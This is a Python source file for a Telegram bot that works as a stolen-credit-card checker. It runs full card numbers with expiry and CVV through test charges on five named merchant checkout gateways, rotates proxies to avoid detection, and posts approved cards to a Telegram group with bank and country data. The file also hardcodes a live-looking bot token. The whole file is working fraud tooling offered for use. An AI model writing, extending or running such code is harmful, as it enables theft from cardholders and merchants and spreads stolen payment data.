#!/usr/bin/env python3
"""
Mady Bot - Telegram Card Checker with Proxy Support
Uses multiple gateways from Charge files with proxy rotation
"""

import telebot
import requests
import time
import os
import re
import random
import traceback
from datetime import datetime
import sys

# Add the charge files directory to path
sys.path.insert(0, '100$/100$/')

# Import gateway functions
try:
    from Charge1 import BlemartCheckout
    from Charge2 import DistrictPeopleCheckout
    from Charge3 import SaintVinsonDonateCheckout
    from Charge4 import BGDCheckoutLogic
    from Charge5 import StaleksFloridaCheckoutVNew
    
    GATEWAYS = {
        '1': {'func': BlemartCheckout, 'name': 'Blemart ($4.99)', 'amount': '$4.99'},
        '2': {'func': DistrictPeopleCheckout, 'name': 'District People (€69)', 'amount': '€69.00'},
        '3': {'func': SaintVinsonDonateCheckout, 'name': 'Saint Vinson ($2)', 'amount': '$2.00'},
        '4': {'func': BGDCheckoutLogic, 'name': 'BGD Fresh ($6.50)', 'amount': '$6.50'},
        '5': {'func': StaleksFloridaCheckoutVNew, 'name': 'Staleks ($0.01)', 'amount': '$0.01'}
    }
    DEFAULT_GATEWAY = '5'  # Use Staleks as default (lowest amount)
except ImportError as e:
    print(f"Warning: Could not import some gateways: {e}")
    GATEWAYS = {}
    DEFAULT_GATEWAY = None

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_ID = "-1003538559040"
BOT_CREDIT = "@MissNullMe"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Load proxies
def load_proxies():
    """Load proxies from file"""
    proxy_file = "/home/null/Documents/usetheseproxies.txt"
    proxies = []
    
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    # Format: host:port:user:pass
                    parts = line.split(':')
                    if len(parts) >= 4:
                        host = parts[0]
                        port = parts[1]
                        user = parts[2]
                        password = parts[3]
                        proxy = {
                            'http': f'http://{user}:{password}@{host}:{port}',
                            'https': f'http://{user}:{password}@{host}:{port}'
                        }
                        proxies.append(proxy)
    
    print(f"Loaded {len(proxies)} proxies")
    return proxies

PROXIES = load_proxies()

# User states
user_states = {}
user_gateway_preference = {}

def get_random_proxy():
    """Get a random proxy from the list"""
    if PROXIES:
        return random.choice(PROXIES)
    return None

def check_card_with_gateway(cc_combo, gateway_id='5'):
    """Check card using specified gateway"""
    if gateway_id not in GATEWAYS:
        return "error", "Invalid gateway selected"
    
    gateway = GATEWAYS[gateway_id]
    try:
        # Call the gateway function
        result = gateway['func'](cc_combo)
        
        # Parse result based on gateway type
        if isinstance(result, dict):
            # Staleks returns dict
            if 'error' in result:
                if 'declined' in str(result['error']).lower():
                    return "declined", result['error']
                return "error", result['error']
            elif result.get('result') == 'success':
                return "approved", f"Charged {gateway['amount']}"
            elif 'messages' in result:
                msg = ' '.join(result['messages']) if isinstance(result['messages'], list) else str(result['messages'])
                if 'success' in msg.lower() or 'thank you' in msg.lower():
                    return "approved", f"Charged {gateway['amount']}"
                return "declined", msg[:100]
            else:
                return "declined", "Payment failed"
        else:
            # Other gateways return string
            result_str = str(result).lower()
            if 'charged' in result_str or 'success' in result_str or 'approved' in result_str:
                return "approved", f"{result} - {gateway['amount']}"
            elif 'declined' in result_str or 'insufficient' in result_str:
                return "declined", result
            elif 'error' in result_str:
                return "error", result
            else:
                return "declined", result
                
    except Exception as e:
        return "error", f"Gateway error: {str(e)[:100]}"

def get_bin_info(card_number):
    """Get BIN information for a card"""
    bin_number = card_number[:6]
    
    # Try to get BIN info with proxy
    proxy = get_random_proxy()
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", 
                               proxies=proxy, timeout=5)
        if response.status_code == 200:
            data = response.json()
            brand = data.get('brand', 'Unknown').upper()
            card_type = data.get('type', 'Unknown').upper()
            bank = data.get('bank', {}).get('name', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            emoji = data.get('country', {}).get('emoji', '')
            
            return {
                'brand': brand,
                'type': card_type,
                'bank': bank,
                'country': country,
                'emoji': emoji
            }
    except:
        pass
    
    # Fallback to basic detection
    if card_number.startswith('4'):
        return {'brand': 'VISA', 'type': 'DEBIT/CREDIT', 'bank': 'Unknown', 'country': 'Unknown', 'emoji': ''}
    elif card_number.startswith('5'):
        return {'brand': 'MASTERCARD', 'type': 'DEBIT/CREDIT', 'bank': 'Unknown', 'country': 'Unknown', 'emoji': ''}
    else:
        return {'brand': 'Unknown', 'type': 'Unknown', 'bank': 'Unknown', 'country': 'Unknown', 'emoji': ''}

@bot.message_handler(commands=['start'])
def start_handler(message):
    """Handle /start command"""
    welcome_text = f"""
🤖 <b>Welcome to Mady Bot!</b>

<b>Available Commands:</b>
/check <i>filepath</i> - Check cards from file
/gate - Select gateway (1-5)
/stop - Stop current checking

<b>Available Gateways:</b>
1️⃣ Blemart - $4.99 USD
2️⃣ District People - €69.00 EUR
3️⃣ Saint Vinson - $2.00 USD
4️⃣ BGD Fresh - $6.50 CAD
5️⃣ Staleks - $0.01 USD (Default)

<b>Usage:</b>
• Send a card: <code>4532123456789012|12|25|123</code>
• Check file: <code>/check /home/null/Desktop/TestCards.txt</code>
• Upload a .txt file directly

<b>Bot by:</b> {BOT_CREDIT}
<b>Proxies:</b> {len(PROXIES)} loaded
"""
    bot.send_message(message.chat.id, welcome_text, parse_mode='HTML')

@bot.message_handler(commands=['gate'])
def gate_handler(message):
    """Handle gateway selection"""
    user_id = str(message.from_user.id)
    
    text = """
<b>Select Gateway:</b>

1️⃣ Blemart - $4.99 USD
2️⃣ District People - €69.00 EUR  
3️⃣ Saint Vinson - $2.00 USD
4️⃣ BGD Fresh - $6.50 CAD
5️⃣ Staleks - $0.01 USD (Recommended)

Reply with number (1-5):
"""
    bot.send_message(message.chat.id, text, parse_mode='HTML')
    user_states[user_id] = 'selecting_gateway'

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    """Handle stop command"""
    user_id = str(message.from_user.id)
    stop_file = f"{user_id}.stop"
    
    with open(stop_file, 'w') as f:
        f.write("stop")
    
    bot.reply_to(message, "🛑 Stopping current process...")

@bot.message_handler(commands=['check'])
def check_file_handler(message):
    """Handle /check command with file path"""
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /check /path/to/file.txt")
        return
    
    file_path = parts[1].strip()
    
    if not os.path.exists(file_path):
        bot.reply_to(message, f"❌ File not found: {file_path}")
        return
    
    process_file(message, file_path)

def process_file(message, file_path):
    """Process a file of cards"""
    user_id = str(message.from_user.id)
    stop_file = f"{user_id}.stop"
    
    # Remove stop file if exists
    if os.path.exists(stop_file):
        os.remove(stop_file)
    
    # Get user's gateway preference
    gateway_id = user_gateway_preference.get(user_id, DEFAULT_GATEWAY)
    gateway_name = GATEWAYS.get(gateway_id, {}).get('name', 'Unknown')
    
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        
        cards = [line.strip() for line in lines if line.strip() and '|' in line]
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file")
            return
        
        # Send initial message
        status_msg = bot.reply_to(message, f"""
⏳ <b>Starting Check...</b>

<b>File:</b> {os.path.basename(file_path)}
<b>Cards:</b> {len(cards)}
<b>Gateway:</b> {gateway_name}
<b>Rate:</b> 2.5s per card

<i>Processing...</i>
""", parse_mode='HTML')
        
        approved = 0
        declined = 0
        errors = 0
        
        for idx, card in enumerate(cards, 1):
            # Check for stop signal
            if os.path.exists(stop_file):
                bot.edit_message_text(f"🛑 Stopped at card {idx}/{len(cards)}", 
                                    message.chat.id, status_msg.message_id)
                os.remove(stop_file)
                break
            
            # Check the card
            status, result = check_card_with_gateway(card, gateway_id)
            
            if status == "approved":
                approved += 1
                
                # Get BIN info
                bin_info = get_bin_info(card.split('|')[0])
                
                # Post to group
                group_msg = f"""
✅✅ <b>APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> {gateway_name}
<b>Response:</b> {result} 🟢

<b>BIN:</b> {card[:6]} | {bin_info['brand']} {bin_info['type']}
<b>Bank:</b> {bin_info['bank']}
<b>Country:</b> {bin_info['country']} {bin_info['emoji']}

<b>Checked by:</b> @{message.from_user.username or 'User'}
<b>Bot:</b> {BOT_CREDIT}
"""
                try:
                    bot.send_message(GROUP_ID, group_msg, parse_mode='HTML')
                except:
                    pass
                
            elif status == "declined":
                declined += 1
            else:
                errors += 1
            
            # Update progress every 10 cards
            if idx % 10 == 0 or idx == len(cards):
                progress_text = f"""
⏳ <b>Checking in Progress...</b>

<b>Progress:</b> {idx}/{len(cards)}
<b>Gateway:</b> {gateway_name}

✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}

<i>Processing...</i>
"""
                try:
                    bot.edit_message_text(progress_text, message.chat.id, 
                                        status_msg.message_id, parse_mode='HTML')
                except:
                    pass
            
            # Rate limiting
            time.sleep(2.5)
        
        # Final summary
        final_text = f"""
🎉 <b>Check Complete!</b>

<b>File:</b> {os.path.basename(file_path)}
<b>Gateway:</b> {gateway_name}

<b>Results:</b>
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}
📊 Total: {len(cards)}

<b>Success Rate:</b> {(approved/len(cards)*100):.1f}%
"""
        bot.edit_message_text(final_text, message.chat.id, 
                            status_msg.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        traceback.print_exc()

@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Handle uploaded text files"""
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please upload a .txt file")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save temporarily
        temp_file = f"/tmp/{message.from_user.id}_upload.txt"
        with open(temp_file, 'wb') as f:
            f.write(downloaded_file)
        
        # Process the file
        process_file(message, temp_file)
        
        # Clean up
        os.remove(temp_file)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error processing file: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    """Handle all other messages"""
    user_id = str(message.from_user.id)
    text = message.text.strip()
    
    # Check if selecting gateway
    if user_states.get(user_id) == 'selecting_gateway':
        if text in GATEWAYS:
            user_gateway_preference[user_id] = text
            gateway_name = GATEWAYS[text]['name']
            bot.reply_to(message, f"✅ Gateway set to: {gateway_name}")
            del user_states[user_id]
        else:
            bot.reply_to(message, "❌ Invalid selection. Choose 1-5")
        return
    
    # Check if it's a card
    if '|' in text and len(text.split('|')) == 4:
        gateway_id = user_gateway_preference.get(user_id, DEFAULT_GATEWAY)
        gateway_name = GATEWAYS.get(gateway_id, {}).get('name', 'Unknown')
        
        bot.reply_to(message, f"⏳ Checking card with {gateway_name}...")
        
        status, result = check_card_with_gateway(text, gateway_id)
        
        if status == "approved":
            # Get BIN info
            bin_info = get_bin_info(text.split('|')[0])
            
            # Send to user
            user_msg = f"""
✅ <b>APPROVED!</b>

<b>Card:</b> <code>{text}</code>
<b>Gateway:</b> {gateway_name}
<b>Response:</b> {result}

<b>BIN Info:</b>
• Brand: {bin_info['brand']} {bin_info['type']}
• Bank: {bin_info['bank']}
• Country: {bin_info['country']} {bin_info['emoji']}
"""
            bot.send_message(message.chat.id, user_msg, parse_mode='HTML')
            
            # Post to group
            group_msg = f"""
✅✅ <b>APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{text}</code>
<b>Gateway:</b> {gateway_name}
<b>Response:</b> {result} 🟢

<b>BIN:</b> {text[:6]} | {bin_info['brand']} {bin_info['type']}
<b>Bank:</b> {bin_info['bank']}
<b>Country:</b> {bin_info['country']} {bin_info['emoji']}

<b>Checked by:</b> @{message.from_user.username or 'User'}
<b>Bot:</b> {BOT_CREDIT}
"""
            try:
                bot.send_message(GROUP_ID, group_msg, parse_mode='HTML')
            except:
                pass
                
        elif status == "declined":
            bot.reply_to(message, f"❌ <b>DECLINED</b>\n\n{result}", parse_mode='HTML')
        else:
            bot.reply_to(message, f"⚠️ <b>ERROR</b>\n\n{result}", parse_mode='HTML')

# Main execution
if __name__ == "__main__":
    print("="*50)
    print(f"🤖 Mady Bot Starting...")
    print(f"Token: {BOT_TOKEN[:20]}...")
    print(f"Group: {GROUP_ID}")
    print(f"Proxies: {len(PROXIES)} loaded")
    print(f"Gateways: {len(GATEWAYS)} available")
    print("="*50)
    
    if not GATEWAYS:
        print("⚠️ WARNING: No gateways available! Check Charge files.")
    
    # Start polling
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
